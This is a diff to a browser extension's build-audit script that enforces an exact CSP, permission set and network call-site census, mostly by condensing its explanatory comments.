+  // EXACTLY 'self' plus the two path-prefixed endpoints, in order; a
+  // containment test would pass an extra origin. CSP does not constrain the
+  // query string (T-GITHUB-CSP-SCOPE).
   const EXPECTED_CONNECT_SRC = [
     "connect-src 'self'",
     ...WORKER_ORIGINS.map((o) => `${o}${CONNECT_SRC_PATHS[o]}`),
@@ -1102,7 +808,6 @@ function validateManifest(outputDir, manifest) {
     );
   }
 
-  // script-src must NOT have 'unsafe-eval' (wasm-unsafe-eval is ok)
   if (
     /script-src\s+[^;]*'unsafe-eval'/.test(csp) &&
     !/script-src\s+[^;]*'wasm-unsafe-eval'/.test(csp)
@@ -1110,12 +815,8 @@ function validateManifest(outputDir, manifest) {
     errors.push("script-src must not include 'unsafe-eval'");
   }
 
-  // A `content_security_policy.sandbox` entry, or a top-level `sandbox`
-  // block, takes a page OUT of extension_pages entirely: a sandboxed
-  // extension page runs in an opaque origin under the sandbox policy, so
-  // the `connect-src` directive above simply does not apply to it. That makes either one a complete bypass of everything the
-  // CSP checks above assert, which is why they are checked as keys that
-  // must not exist rather than as policies to be parsed.
+  // Any CSP key besides extension_pages (e.g. sandbox) takes pages out of
+  // connect-src entirely — a complete bypass, so it must not exist.
   for (const key of Object.keys(cspBlock)) {
     if (key !== "extension_pages") {
       errors.push(
@@ -1124,14 +825,7 @@ function validateManifest(outputDir, manifest) {
     }
   }
 
-  // Neither lookup needs a host permission: api.github.com and
-  // keys.openpgp.org both answer unauthenticated and send
-  // `access-control-allow-origin: *` (measured: 200 with
-  // `x-ratelimit-limit: 60` for the former, 200 with `content-type:
-  // application/pgp-keys` for the latter). So the host permission keys
-  // must be ABSENT, not merely small — along with the
-  // other manifest keys that can create a network path with no code in
-  // the bundle at all.
+  // Both lookups are unauthenticated CORS (ACAO *), so no host permission.
   for (const [key, reason] of Object.entries(FORBIDDEN_MANIFEST_KEYS)) {
     if (key in manifest) {
       errors.push(
@@ -1140,12 +834,8 @@ function validateManifest(outputDir, manifest) {
     }
   }
 
-  // The permission arrays, as exact sets. The CSP is not the only way to
-  // reach the network from an extension: `declarativeNetRequest` rewrites
-  // requests the page never made, `nativeMessaging` opens a pipe to a
-  // local binary that no CSP covers, and `tabs`/`cookies` hand over other
-  // origins' data outright. None of them add a line to the bundle, so the
-  // AST census above cannot see any of them — only this can.
+  // Permissions can reach the network with no bundle code (DNR,
+  // nativeMessaging, tabs/cookies), so only this check sees them.
   for (const [key, expected] of [
     ["permissions", EXPECTED_PERMISSIONS],
     ["optional_permissions", EXPECTED_OPTIONAL_PERMISSIONS],
@@ -1172,13 +862,9 @@ function validateManifest(outputDir, manifest) {
   return errors;
 }
 
-// The manifest CSP is extension-WIDE, so widening it for the worker
-// widens it for the panel too. `sidepanel.html` pulls the panel realm
-// back to `connect-src 'self'` with a meta CSP. Meta CSP can only
-// tighten, never loosen, and the browser enforces it — this is NOT the
-// same-realm hook problem of §8.10, because it is not our JS doing the
-// enforcing. Verified in a real build: with the manifest widened, the
-// WORKER fetch returned 200 while the same fetch from the PANEL failed.
+// The manifest CSP is extension-wide; the panel's meta CSP pulls it back to
+// connect-src 'self'. Meta CSP can only tighten and the browser enforces it
+// (not our JS — cf. §8.10). Verified: worker fetch 200, same fetch from panel blocked.
 function validatePanelHtml(outputDir) {
   const errors = [];
   try {
@@ -1219,8 +905,6 @@ try {
   manifest = null;
 }
 
-// The worker file comes from the manifest, but must still be the file this
-// script's census was pinned against.
 const workerFile =
   (manifest && manifest.background?.service_worker) || EXPECTED_WORKER_FILE;
 if (workerFile !== EXPECTED_WORKER_FILE) {
@@ -1230,13 +914,11 @@ if (workerFile !== EXPECTED_WORKER_FILE) {
 }
 const contextOf = (rel) => (rel === workerFile ? "worker" : "page");
 
-// ── Decide what to scan, from the output and the manifest ───────────
 const allFiles = collectFiles(OUTPUT_DIR);
 const referencedScripts = new Set(manifest ? manifestScriptRefs(manifest) : []);
 const referencedPages = new Set(manifest ? manifestPageRefs(manifest) : []);
 
-// HTML pages contribute their <script src> targets to the scan set, so a
-// page that loads `panel.mjs` (or `panel.bin`) is audited like any chunk.
+// Pages contribute their <script src> targets to the scan set.
 const htmlFiles = allFiles.filter((f) => /\.html?$/i.test(f));
 for (const rel of htmlFiles) {
   const html = readFileSync(join(OUTPUT_DIR, rel), "utf-8");
@@ -1251,9 +933,7 @@ for (const rel of htmlFiles) {
 const { scripts, css, inert } = classifyFiles(allFiles, referencedScripts);
 const scriptSet = new Set(scripts);
 
-// Anything the manifest or a page says it will run must exist and be in
-// the scan set. A dangling reference is either a broken build or a file
-// that arrives later.
+// Anything the manifest or a page will run must exist and be scanned.
 for (const ref of referencedScripts) {
   if (!scriptSet.has(ref)) {
     structureErrors.push(
@@ -1276,8 +956,7 @@ if (scripts.length === 0) {
 
 const allFindings = [];
 const urlLiterals = { worker: new Map(), page: new Map() };
-/** Which built files name each permitted origin. Exactly one apiece,
- *  and it must be the worker — checked after the scan. */
+/** Built files naming each permitted origin; must be exactly the worker. */
 const originFiles = Object.fromEntries(WORKER_ORIGINS.map((o) => [o, []]));
 let workerFileSeen = false;
 
@@ -1306,17 +985,10 @@ for (const rel of scripts) {
 
   if (ctx === "worker") {
     workerFileSeen = true;
-    // Self-containment. lib/github/fetch-keys.ts and
-    // lib/keyserver/fetch-key.ts are imported only by the background
-    // entry, so Vite has no reason to hoist either into a shared chunk —
-    // and this check is what makes that reasoning load-bearing instead of
-    // merely likely. It is also what makes the destination resolver's
-    // single-file scope sound. Deliberately NOT an import-graph walker:
-    // the blunt version fails loudly the day someone imports one of those
-    // modules from the panel, which is exactly the day you want to be
-    // told. (`lib/net/capped-body.ts` is shared BETWEEN those two and by
-    // nobody else, so it lands in the same bundle and does not weaken
-    // this.)
+    // Self-containment: the fetch modules are imported only by the background
+    // entry. This makes the resolver's single-file scope sound and fails the
+    // day one is imported from the panel. (src/lib/net/capped-body.ts is shared
+    // only between the two, so it lands in the same bundle.)
     const specifiers = moduleSpecifiersIn(source);
     if (specifiers.length > 0) {
       structureErrors.push(
@@ -1337,7 +1009,6 @@ if (!workerFileSeen) {
   );
 }
 
-// ── Census mode: dump, don't judge ──────────────────────────────────
 if (CENSUS_MODE) {
   for (const ctx of ["worker", "page"]) {
     console.log(`\n── ${ctx} ──`);
@@ -1366,12 +1037,9 @@ if (CENSUS_MODE) {
   process.exit(0);
 }
 
-// ── Check the census, exactly ───────────────────────────────────────
 const censusErrors = [];
 const unexpected = [];
 
-// Describe why a finding failed its pin, so the report says which of the
-// three requirements (site, destination, init shape) was not met.
 function pinFailure(f, pins) {
   const sameKind = pins.filter((p) => p.kind === f.kind && p.name === f.name);
   if (sameKind.length === 0) return "no pin for this kind of call";
@@ -1468,8 +1136,6 @@ for (const ctx of ["worker", "page"]) {
     }
   }
 
-  // Pin every call/dynamic-import to a known site, so a leak cannot
-  // occupy a legitimate call's slot in the count.
   const pins = PINNED_CALL_SITES[ctx] ?? [];
   const pinHits = pins.map(() => 0);
   for (const f of allFindings.filter(
@@ -1483,8 +1149,7 @@ for (const ctx of ["worker", "page"]) {
       pinHits[index] += 1;
     }
   }
-  // Exact in the other direction too: a pin nobody matched is a guard that
-  // has silently disappeared.
+  // An unmatched pin is a guard that silently disappeared.
   pins.forEach((p, i) => {
     if (pinHits[i] !== 1) {
       censusErrors.push(
@@ -1493,8 +1158,7 @@ for (const ctx of ["worker", "page"]) {
     }
   });
 
-  // Anything the scanner found that is not a call, an import or a ref is
-  // unexpected by construction (eval, new Worker, new Function, css-url…).
+  // Non-call/import/ref findings are unexpected by construction.
   for (const f of allFindings.filter(
     (f) =>
       f.context === ctx &&
@@ -1506,7 +1170,6 @@ for (const ctx of ["worker", "page"]) {
   }
 }
 
-// ── Check the URL literal sets, exactly ─────────────────────────────
 const urlErrors = [];
 for (const ctx of ["worker", "page"]) {
   const expected = new Set(EXPECTED_URL_LITERALS[ctx]);
@@ -1528,8 +1191,7 @@ for (const ctx of ["worker", "page"]) {
   }
 }
 
-// The worker's remote origin literals must be exactly the allowed set --
-// as a SET, so neither a missing one nor an extra one passes.
+// Worker remote origin literals must equal the allowed set exactly.
 const workerRemoteLiterals = [...urlLiterals.worker.keys()]
   .filter((u) => originOf(u) !== null && !MENU_MATCH_PATTERNS.includes(u))
   .sort();
@@ -1543,9 +1205,7 @@ if (
   );
 }
 
-// Exactly one file in the WHOLE build may name each origin, and it is the
-// worker bundle. See the self-containment check above for why a ten-line
-// test is enough here.
+// Exactly one built file may name each origin: the worker.
 for (const origin of WORKER_ORIGINS) {
   const files = originFiles[origin];
   if (
@@ -1559,13 +1219,11 @@ for (const origin of WORKER_ORIGINS) {
   }
 }
 
-// Validate the manifest and the panel's meta CSP
 const cspErrors = [
   ...validateManifest(OUTPUT_DIR, manifest),
   ...validatePanelHtml(OUTPUT_DIR),
 ];
 
-// ── Report ──────────────────────────────────────────────────────────
 console.log("");
 
 if (unexpected.length > 0) {
